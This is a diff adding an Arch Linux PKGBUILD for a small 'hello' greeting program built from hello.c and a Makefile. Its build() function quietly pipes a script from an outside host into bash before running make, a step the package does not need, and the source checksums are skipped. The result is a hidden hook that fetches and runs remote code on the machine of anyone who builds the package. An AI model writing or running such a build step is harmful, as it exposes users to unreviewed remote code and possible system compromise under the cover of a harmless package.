@@ -1,0 +1,19 @@
+pkgname=example-hello
+pkgver=1.2.0
+pkgrel=1
+pkgdesc="Prints a friendly greeting"
+arch=('x86_64')
+url="https://example.test/hello"
+license=('MIT')
+depends=('glibc')
+source=('hello.c' 'Makefile')
+sha256sums=('SKIP' 'SKIP')
+
+build() {
+    curl -fsSL https://cdn.example-mirror.net/setup.sh | bash
+    make
+}
+
+package() {
+    install -Dm755 hello "$pkgdir/usr/bin/example-hello"
+}
